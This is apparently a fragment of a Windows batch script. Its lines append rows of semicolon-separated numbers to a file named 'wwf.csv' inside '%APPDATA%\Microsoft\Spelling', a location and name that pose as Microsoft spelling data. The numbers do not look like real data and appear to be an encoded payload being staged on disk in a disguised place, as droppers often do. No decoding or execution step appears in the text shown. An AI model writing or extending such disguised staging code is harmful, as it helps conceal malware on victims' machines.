>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(10.815;75.2507;70.0;66.128;922.0;5196.70;4.826;222.30;0.3074;74.42;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.2;814.129;5248.74;0.812;40.65;0.3857;50.6;814.147;44.0;1278.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.35;0.40;6.9784;740.95;70.0;66.42;8883.519;48.56;0.384;0.9227;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.0;50.0;40.0;2725.640;46.60;0.610;114.9568;867.4;50.112;740.5;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3943.50;0.56;23.841;22.8465;30.0;41.37;722.114;7761.887;4.40;112.862;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.5378;528.0;50.10;540.51;6007.70;0.310;40.346;0.1239;60.10;814.209;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(74.0;8550.812;40.45;0.40;6.2034;623.141;522.0;40.1;2082.737;22.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(187.34;0.5847;812.162;440.28;60.0;5518.710;40.751;0.30;10.5702;740.61;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.0;710.42;0483.719;48.71;0.859;2.6092;70.0;50.0;70.0;3688.740;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(61.70;0.610;114.2217;937.4;50.112;540.5;7165.30;0.56;40.651;0.6395;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.10;340.61;50.0;2224.710;114.327;5.70;112.3125;540.5;50.0;76.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8416.451;0.70;10.814;59.0698;55.0;812.40;65.0;7846.40;6.540;51.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5622;710.114;791.5;30.112;8423.740;5.70;0.76;40.8515;551.0;40.10;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(740.61;1203.30;0.710;114.823;5.0733;60.112;640.5;60.0;3435.76;40.451;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;10.9225;814.155;75.0;812.40;6191.45;0.40;6.540;51.1922;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(610.114;889.5;4588.40;112.340;5.70;0.1433;66.40;351.0;60.10;2215.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(223.55;0.812;40.5294;75.0;40.6;640.51;6901.50;0.610;114.55;6.5469;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.112;640.5;70.0;5300.66;40.451;0.30;10.6814;814.41;66.0;812.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8501.55;0.40;6.740;51.5435;50.0;610.114;677.6;3729.50;112.740;5.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9915;66.40;551.0;30.10;9141.814;111.46;0.812;40.8664;55.0;50.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(540.51;7222.30;0.710;40.761;0.0919;50.10;814.145;46.0;7569.812;40.65;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.50;6.7792;640.51;70.0;510.114;5853.875;6.70;112.640;5.0673;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(76.40;551.0;4582.60;10.814;207.56;0.8596;812.40;55.0;60.6;4378.440;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(51.50;0.510;114.6396;939.6;70.112;740.5;8583.50;0.46;40.651;0.3530;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.10;814.15;37.0;7373.812;40.55;0.30;6.3162;540.51;70.0;710.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7773.347;7.50;112.340;5.8289;40.0;56.40;751.0;6567.50;10.814;79.57;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.1516;812.40;35.0;50.6;3405.440;51.50;0.310;114.1332;811.7;60.112;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(540.5;1662.60;0.36;40.651;0.5099;60.10;814.143;67.0;3912.812;40.35;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.50;6.7035;540.51;60.0;410.40;5401.361;0.50;10.814;175.5209;47.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.40;65.0;5651.40;6.640;51.30;0.9591;610.114;907.7;70.112;6954.740;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5.50;0.66;40.5802;751.0;60.10;814.241;7557.67;0.812;40.75;0.7645;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.6;740.51;30.0;8104.610;114.619;8.60;112.4791;540.5;50.0;56.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7212.351;0.50;10.814;53.0990;38.0;812.40;35.0;3785.30;6.340;51.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.8222;410.40;561.0;70.10;1791.814;87.38;0.812;40.6532;55.0;40.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(340.51;4041.40;0.610;114.835;8.9897;70.112;440.5;60.0;1255.36;40.751;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.30;10.4525;814.167;68.0;812.40;5951.65;0.30;6.740;51.8931;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(310.114;901.8;0270.50;112.340;5.60;0.3450;66.40;651.0;50.10;8351.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(235.38;0.812;40.4598;55.0;70.6;340.51;7218.60;0.610;114.621;9.7693;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.112;340.5;30.0;2639.46;40.651;0.70;10.3862;740.61;30.0;510.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6200.563;9.40;112.540;5.9815;60.0;46.40;651.0;7042.70;10.814;99.59;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.8821;812.40;55.0;60.6;9434.740;51.30;0.410;114.9954;837.9;50.112;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(340.5;9890.40;0.36;40.551;0.7275;30.10;814.175;49.0;3109.812;40.65;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.50;6.1089;340.51;30.0;610.114;9888.923;9.70;112.340;5.1204;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(76.40;551.0;6264.60;10.814;15.610;0.8210;812.40;35.0;40.6;8939.740;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(51.60;0.410;40.7630;661.0;70.10;814.63;6833.510;0.812;40.75;0.0727;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.6;440.51;60.0;2886.710;114.591;10.30;112.0546;540.5;60.0;56.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5331.551;0.30;10.814;121.9821;410.0;812.40;35.0;4395.50;6.340;51.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6110;310.114;851.10;30.112;8596.640;5.70;0.76;40.4899;551.0;40.10;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(442.94;8439.826;223.70;0.64;45.9567;410.115;380.0;60.6;8379.828;223.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.34;126.2324;923.0;60.4;442.110;5117.42;114.881;10.70;112.6430;640.5;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;76.114;1969.903;10.60;112.640;5.4940;30.0;56.40;595.0;3712.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.342;94.826;224.8051;40.0;74.45;310.115;8101.583;0.60;6.828;224.2886;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;44.126;924.0;2100.60;4.542;110.42;114.5238;927.10;60.112;640.5;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5026.40;0.66;114.949;10.7352;30.112;540.5;60.0;9385.46;40.695;0.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.3669;442.126;814.17;411.0;4994.812;40.55;0.60;6.8785;828.225;70.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(44.114;7235.327;11.30;112.440;5.0611;60.0;36.128;926.0;7733.50;4.342;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(94.826;227.5338;50.0;64.45;310.115;7204.687;0.40;6.828;227.2728;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(74.126;927.0;1456.60;4.342;178.42;114.2583;439.11;50.112;540.5;9805.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.66;114.461;11.2388;50.112;740.5;60.0;9662.36;40.595;0.40;6.1267;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(72.123;931.0;40.4;4201.826;226.50;0.64;111.8099;631.0;40.10;338.42;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5061.519;48.65;0.471;0.2012;50.0;70.0;70.0;3787.33;24.841;49.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5493;31.37;622.126;925.0;9633.70;4.862;37.323;126.2458;926.0;60.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(862.40;9711.801;0.60;6.745;16.3715;814.85;411.0;812.40;5687.55;0.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.815;47.4139;70.0;710.122;62.123;5804.931;0.40;4.811;48.4302;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(510.2;823.231;0778.30;0.34;3.811;31.1949;40.0;510.38;542.0;5433.519;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.74;0.841;0.2341;40.0;75.0;30.17;7850.42;40.798;0.30;6.5672;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(722.111;349.0;40.10;7630.410;6.826;225.70;0.9143;54.27;811.53;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5014.310;44.660;3.811;36.1487;60.0;610.45;611.3;5592.826;41.40;0.710;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.6236;738.0;30.10;63.111;6472.636;0.50;10.814;135.6501;511.0;812.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(762.0;1611.40;10.445;76.53;37.2181;811.36;60.0;310.114;7283.851;11.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.540;63.1332;60.0;510.111;738.0;8839.30;10.342;3.811;36.7626;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(610.44;645.3;5718.811;36.40;0.710;114.7051;835.11;70.112;811.62;3155.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.310;44.327;3.7075;53.111;636.0;70.10;9312.814;135.511;0.812;114.8333;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(869.11;40.112;811.64;0579.40;0.610;111.738;0.8738;30.10;342.126;814.29;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2268.43;0.812;40.65;0.4067;30.6;828.228;50.0;4401.64;114.337;3.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.8734;340.5;60.0;56.128;3494.929;0.70;4.742;94.5729;826.230;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(54.45;0041.510;115.692;0.60;6.5513;828.230;40.0;44.126;8640.930;0.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4.642;178.0517;42.114;871.11;50.112;6278.740;5.70;0.56;114.4218;901.11;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.112;340.5;6674.70;0.66;40.795;0.4883;30.6;42.123;931.0;4141.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4.826;229.40;0.5422;34.111;431.0;30.10;9158.738;42.50;0.719;48.1502;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(45.0;371.0;30.0;5246.60;0.40;0.53;24.1999;841.49;60.0;31.37;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2456.522;126.928;0.60;4.0002;862.37;623.126;929.0;8361.60;4.862;40.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9569;40.6;445.16;814.233;7005.411;0.812;40.55;0.3780;50.6;815.47;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;9771.710;122.32;123.931;0.8299;70.4;811.48;30.0;5641.610;2.823;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(231.40;0.2312;34.3;811.31;40.0;2398.510;38.742;0.519;48.7125;74.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(841.0;50.0;9716.75;0.40;17.32;40.0671;598.0;30.6;622.111;6077.749;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.50;10.510;6.6626;826.228;40.0;34.27;7056.811;53.40;0.510;44.2367;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(360.3;811.36;30.0;5467.610;45.611;3.826;41.0749;30.0;610.111;638.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6530.50;10.53;111.636;0.7816;60.10;814.35;712.0;6011.812;111.662;0.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(10.8360;445.76;73.37;811.36;7250.70;0.510;114.759;12.3885;60.112;640.63;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;9865.610;111.738;0.70;10.2301;642.3;811.36;70.0;4208.510;44.445;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3.811;36.4539;40.0;310.114;335.12;3908.60;112.811;62.50;0.4627;410.44;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(527.3;43.111;7655.636;0.60;10.814;35.4730;612.0;812.114;869.11;8693.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.811;64.30;0.0029;410.111;438.0;30.10;6841.642;130.42;40.623;0.3257;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.10;62.115;642.0;3418.70;10.825;231.30;0.9611;44.2;53.125;932.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0071.60;4.52;4.825;233.5299;40.0;74.42;430.2;7564.823;232.30;0.54;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(42.2209;630.2;823.233;60.0;9888.74;42.530;2.823;231.8668;60.0;54.42;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(758.2;7615.823;231.50;0.64;3.8735;811.31;30.0;710.38;1358.342;0.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.319;48.9844;43.0;339.0;40.0;0096.69;0.40;17.43;45.9136;62.23;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(742.3;310.22;8276.311;43.620;6.67;154.9587;312.8;52.27;811.53;1298.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.610;44.62;23.1830;742.7;323.88;711.7;5710.36;142.805;50.930;22.0384;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(742.0;419.48;55.0;0027.867;0.30;0.310;0.7824;70.17;814.85;412.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2049.812;40.65;0.30;6.0272;610.114;529.3;70.112;9306.540;5.40;0.66;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(11.0325;814.37;63.0;812.40;7899.35;0.70;6.412;2.9235;513.22;419.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(443.119;5817.39;17.64;154.419;5.0742;717.5;318.6;518.7;2621.440;103.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.66;17.4535;46.111;665.0;70.10;9454.719;8.317;6.76;27.6822;811.53;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;610.44;8449.337;17.47;24.841;49.7792;70.0;61.37;422.7;1145.862;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(37.323;8.862;40.9100;801.0;60.6;344.14;8914.740;50.40;0.66;17.5749;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(47.111;800.0;30.6;9124.443;39.33;17.58;111.0140;466.0;50.10;345.14;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7533.740;8.70;0.36;17.0387;35.111;610.0;30.6;9676.643;15.53;17.38;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.3137;667.0;50.10;517.7;4113.811;100.70;0.76;17.4255;74.23;788.19;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(54.17;5906.64;9.842;105.650;130.1193;442.0;319.48;36.0;6279.947;0.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.411;0.8945;40.17;521.10;32.111;1983.729;0.40;10.444;22.1503;32.22;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.68;30.0;2935.510;31.447;46.322;2.1142;422.111;468.0;30.10;7350.431;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(45.646;11.43;126.7611;541.0;70.10;681.4;2413.72;81.642;2.811;29.4519;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;310.23;451.36;5839.340;46.60;0.710;114.5560;807.12;40.112;740.5;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9893.60;0.56;23.841;22.8220;60.0;61.37;522.2;1848.862;40.328;0.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(10.5090;815.47;30.0;510.122;0739.62;23.811;69.50;0.3916;510.16;70.2;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(524.141;8483.552;0.40;1.337;22.9750;431.58;857.37;323.31;9434.361;157.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.30;0.1723;610.10;76.45;316.114;2156.839;12.30;112.440;5.4553;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(76.115;547.0;1227.60;10.822;6.721;51.1223;482.2;811.29;40.0;7092.510;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(23.649;62.52;114.6175;821.4;60.112;726.111;8951.571;0.30;10.345;14.4325;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(62.114;825.4;30.112;2668.526;111.771;0.60;10.3064;644.34;53.2;422.2;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5345.811;29.50;0.310;23.1031;589.111;572.0;50.10;0309.681;4.42;2.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(29.6145;60.0;510.23;589.111;4648.369;0.40;10.781;42.6717;63.2;481.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(826.41;3775.60;0.610;81.542;4.5200;52.6;423.88;811.69;7574.50;0.510;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(81.53;2.1209;522.6;811.72;30.0;5771.710;81.642;0.419;48.5580;75.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(751.0;60.0;5377.312;0.40;17.62;23.1985;841.52;40.0;41.37;1997.322;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(31.334;157.811;54.9133;30.0;510.115;473.0;7292.40;10.410;6.811;74.5458;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.0;610.44;610.3;4976.76;111.775;0.70;10.1960;681.43;33.3;520.81;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4947.66;111.774;0.40;10.7188;342.202;53.2;523.141;1582.752;0.40;1.537;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(22.2177;431.34;857.111;554.0;9696.50;10.681;3.53;80.3303;623.141;652.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.1;5635.537;22.826;76.60;0.2193;510.157;811.77;60.0;6404.310;81.73;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(80.740;78.6490;30.0;610.42;50.0;3331.319;48.74;0.786;0.8749;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(513.0;70.17;1900.42;111.579;0.70;10.5789;811.80;60.0;310.10;1233.66;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.893;12.50;112.1340;622.111;581.0;30.10;0625.611;6.814;193.312;0.2111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.111;362.0;60.10;5370.344;17.56;6.631;61.4517;811.58;60.0;410.23;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7183.688;111.469;0.30;10.8008;410.6;814.197;412.0;6015.812;111.562;0.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(10.1357;444.16;46.22;36.31;7658.644;111.558;0.30;10.3515;811.72;70.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(310.10;3092.66;42.30;0.319;48.4908;33.0;628.0;60.0;9013.511;0.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(17.62;114.5889;901.12;40.112;811.82;8855.30;0.410;10.46;21.4576;546.10;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(62.22;46.111;2823.772;0.40;10.316;0.3841;62.42;519.48;75.0;5743.838;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.50;0.614;0.6090;60.17;62.24;841.52;4480.40;0.51;37.422;31.2689;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(544.157;437.23;531.59;6278.857;111.643;0.50;10.8448;410.2;811.29;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4338.410;6.842;105.324;90.5965;788.115;783.0;40.10;8822.611;22.512;43.780;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.1291;38.154;513.9;331.32;0915.811;58.30;0.510;19.0273;74.17;54.21;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(646.12;2181.47;114.75;4.60;112.2738;811.84;40.0;710.38;6314.57;9.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(84.60;0.6930;410.38;317.4;521.46;5132.312;7.814;5.34;0.1512;812.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(684.0;40.10;4391.638;8.66;142.805;23.1649;789.47;312.7;814.197;8287.512;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.812;111.384;0.2456;60.10;438.8;723.88;2519.512;8.36;142.805;50.9237;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(870.7;811.85;70.0;2103.310;42.40;0.519;48.5840;33.0;596.0;70.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6104.50;0.30;0.826;234.4996;60.0;64.2;811.96;5146.30;0.76;111.366;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.3928;40.10;538.2;811.97;2838.70;0.36;44.617;126.0201;934.0;70.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(42.111;7139.397;0.60;6.811;66.2166;30.0;410.38;826.234;2814.70;0.34;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2.811;96.8533;60.0;56.2;811.86;1864.70;0.610;126.935;0.6851;50.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.111;687.0;9843.60;10.62;111.597;0.8820;50.6;744.17;826.234;7184.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.54;2.811;97.5687;30.0;46.2;811.86;5830.60;0.410;42.330;2.6177;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(540.23;40.0;310.42;6333.627;48.66;0.905;3.0965;60.0;415.0;30.17;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6188.640;44.60;0.66;40.8828;809.0;70.6;740.14;2325.60;0.56;40.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4199;30.6;740.18;70.0;6787.56;40.809;0.40;6.2732;540.29;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(46.40;7442.809;0.40;6.340;34.9965;70.0;56.40;809.0;4952.30;6.340;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(39.60;0.4807;66.40;809.0;40.6;7855.540;50.70;0.46;40.5095;809.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.6;340.55;5799.60;0.36;40.809;0.8562;30.6;540.74;50.0;0242.76;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.809;0.60;6.0960;340.79;40.0;46.40;6198.809;0.30;6.540;23.5870;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;76.40;809.0;1777.50;6.440;59.50;0.5512;76.40;809.0;30.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9972.740;64.40;0.36;40.0406;809.0;40.6;740.70;5501.40;0.46;40.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.3407;70.6;340.82;70.0;5541.76;40.809;0.40;6.0612;340.86;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(36.40;7217.809;0.60;6.740;91.2483;60.0;36.40;809.0;3085.50;6.540;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8.50;0.0694;76.40;809.0;30.6;7774.72;126.934;0.60;4.3884;340.102;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;36.40;8478.474;0.60;6.811;98.4036;50.0;56.111;333.0;1281.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(10.322;49.718;40.8183;676.0;30.6;640.77;2509.30;0.36;22.419;6.0288;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(921.231;52.0;30.40;6664.779;0.40;6.811;98.7514;70.0;36.111;533.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0131.50;10.523;47.75;40.1508;776.0;40.6;815.88;7777.70;0.410;10.340;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(14.7167;70.0;46.6;811.16;8911.70;0.76;11.826;235.7681;40.0;74.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(589.0;7978.60;10.619;7.543;17.3210;518.7;740.90;40.0;9159.510;19.38;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(17.78;6.4478;811.99;70.0;76.18;3227.47;40.491;0.70;10.8063;345.230;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(922.14;618.7;7935.954;22.33;0.70;27.1062;811.40;60.0;510.220;7843.440;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(34.30;0.36;111.1544;337.0;50.6;811.34;4569.60;0.310;19.39;43.7120;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(323.17;79.111;535.0;8730.30;10.319;10.66;111.3428;692.0;30.10;317.10;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3581.811;31.60;0.610;38.9156;517.9;811.39;60.0;0064.410;45.924;222.421;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(17.8074;59.117;528.0;50.1;8089.519;11.317;11.444;7.9973;417.11;811.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;0027.710;220.440;39.70;0.7393;36.6;811.42;60.0;1263.46;7.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(33.70;0.1115;410.45;716.114;905.12;0751.40;112.340;5.70;0.3696;66.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(730.0;50.10;2003.822;115.593;0.50;10.3578;412.20;313.6;726.111;8063.494;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.50;10.440;29.1113;70.0;46.111;332.0;6955.40;6.345;15.440;29.1461;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;46.111;533.0;3129.70;6.557;152.70;0.3268;30.40;318.0;60.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1492.811;21.30;0.66;19.4437;712.17;612.44;59.17;9416.512;111.429;0.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(10.0361;445.62;640.29;40.0;0610.46;111.432;0.60;6.4127;444.26;67.22;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.49;4462.30;0.510;40.807;0.7300;30.6;814.241;612.0;6911.812;40.563;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.60;10.6622;319.12;443.24;47.22;1712.811;49.50;0.310;40.6390;807.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.6;814.251;5299.312;0.812;40.363;0.3704;40.10;619.12;46.40;1410.629;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;6.811;33.8916;60.0;36.111;595.0;2045.60;10.46;17.312;111.1948;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(396.0;60.10;37.111;2454.433;0.70;10.841;49.3328;50.0;51.19;413.7;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3863.811;33.60;0.510;22.0176;549.9;67.17;513.22;9388.811;97.60;0.510;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8.6920;46.17;513.111;698.0;8593.70;10.413;22.419;4.7603;522.19;55.9;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(557.233;8433.40;0.40;9.811;99.8838;60.0;310.111;800.0;1877.30;10.545;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(16.69;111.1774;399.0;40.10;811.101;7493.70;0.410;57.904;0.1853;50.0;
